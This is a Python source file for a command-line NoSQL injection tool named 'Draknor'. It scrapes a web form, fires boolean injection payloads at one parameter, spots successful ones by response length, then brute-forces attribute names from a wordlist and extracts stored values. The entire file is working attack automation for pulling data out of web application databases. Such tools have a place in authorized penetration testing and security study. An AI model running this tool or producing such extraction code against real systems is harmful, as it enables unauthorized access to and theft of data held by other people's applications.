import argparse
from payloads import *
from utils import *


#TODO
# implement custom fail string implementation
# implement array payload handling
# implement time based payload handling
                    

def scan_array_payloads():
    #if payload.startswith("%5b"): # %5b = [
        #       r_data = remove_char_at_index(r_data, r_data.index(f"§{index}§")-1)
        #      r_data = r_data.replace(f"§{index}§", payload)
    pass

def scan_bool_payloads(url, form_data,scan_param_name, default_response):    
    success_payloads=[]
    error_payloads=[]

    for payload, extraction_payload in bool_payloads:        
        # prepare data
        r_data = form_data["post_data"].replace(f"§{scan_param_name}§", quote(payload))

        #send request
        response = send_post_request(url, r_data)

        #is request error
        if response.status_code != default_response.status_code:
            print(f"\t[?] Unexpected Status Code: {response.status_code} {payload}")       
            error_payloads.append([response.status_code, response, [payload, extraction_payload]])
        # is request success
        elif len(response.text) != len(default_response.text):            
            print(f"\t[+] SUCCESS:{payload}")       
            success_payloads.append([payload, extraction_payload])     

    return success_payloads, error_payloads

def main():
    parser = argparse.ArgumentParser(description="Simple NoSQL Enumeration Tool")
    #parser.add_argument('-u', '--url', help="Scan Url to scan")
    parser.add_argument('-t', '--target', help="Scan Target to extract form from")
    parser.add_argument('-p', '--parameter', help="Parameter to test")
    parser.add_argument('-f', '--fail_string', help="Response string for failed requests")
    #parser.add_argument('--arrays', action='store_true', help="Activate array payloads")
    #parser.add_argument('--time', action='store_true', help="Activate time payload")
    #parser.add_argument('-d', '--data', action='store_true', help="Post Data")

    args = parser.parse_args()
    if not args.parameter or not args.target:
        print("[-] Target parameter and target url have to be set")                
        exit()

    # init arg params
    scan_param_name=args.parameter
    fail_message=args.fail_string

    with open("attributes.txt") as file:
        attributes_list = set(l.strip() for l in file.readlines())
    if not attributes_list:
        print("Attributes list attributes.txt could not be found")
        exit()

    print("--- Starting Draknor NoSQL Injection Scanner ---")
    # extract post data from html form
    form_target=args.target
    if not form_target.startswith("http://") or form_target.startswith("http://"):
        form_target = "http://" + form_target
    form_data = extract_form_data(form_target,scan_param_name)

    # prepare attack target url
    parsed_url = urlparse(form_target)
    url = f"{parsed_url.scheme}://{parsed_url.netloc}"+form_data["action"]    
    print("[+] Extracted form:", form_data)
    print("[*] Checking if form target page is dynamic...")
    # get default response for random payload
    default_response = get_random_payload_response(form_data, scan_param_name, url)
    # check if page is dynamic
    default_response_2 = get_random_payload_response(form_data, scan_param_name, url)

    if len(default_response.text) == len(default_response_2.text):
        print("[+] Form target page is not dynamic")
    else:
        print("[-] Page content is dynamic")
        print("[-] You need to specify a fail or success string.")
        exit()

    # Start Scanning
    success_payloads, error_payloads = scan_bool_payloads(url,form_data,scan_param_name, default_response)

    # display results    
    print("Successfull payloads:")
    for p in success_payloads:
        print(p)
        
    print("Error inflicting payloads:")
    for p in error_payloads:
        print(p)
        

    for _, extraction_payload in success_payloads:     
        found_attributes = brute_attribute_names(url, form_data,scan_param_name, default_response, extraction_payload, attributes_list)
        if found_attributes:
            extraction_point = extraction_payload
            break

    results = []
    for attr in found_attributes:
        extraction_attribute_length = get_extraction_parameter_length(url, form_data,scan_param_name, default_response, extraction_payload, extraction_attribute_name=attr)
        if extraction_attribute_length:
            print(f"\t[+] attr.length: {extraction_attribute_length}")
            res = brute_extract_data(url, form_data,scan_param_name, default_response, extraction_point, attr, extraction_attribute_length)
            if res:
                print(f"\t[data] {attr}: {res}")   
                results.append([attr, res])
        else: print(f"[-] Could not get length of {attr}")
    
    print("Extracted attributes:")
    print(", ".join(found_attributes))

    print("Extracted data:")
    for r in results:
        print(f"[+] {r[0]}:{r[1]}")

    #if args.arrays:  
    #    scan_array_payloads()

try:
    main()
except KeyboardInterrupt:
    print("\nCTRL+C detected! Draknor shuting down...")
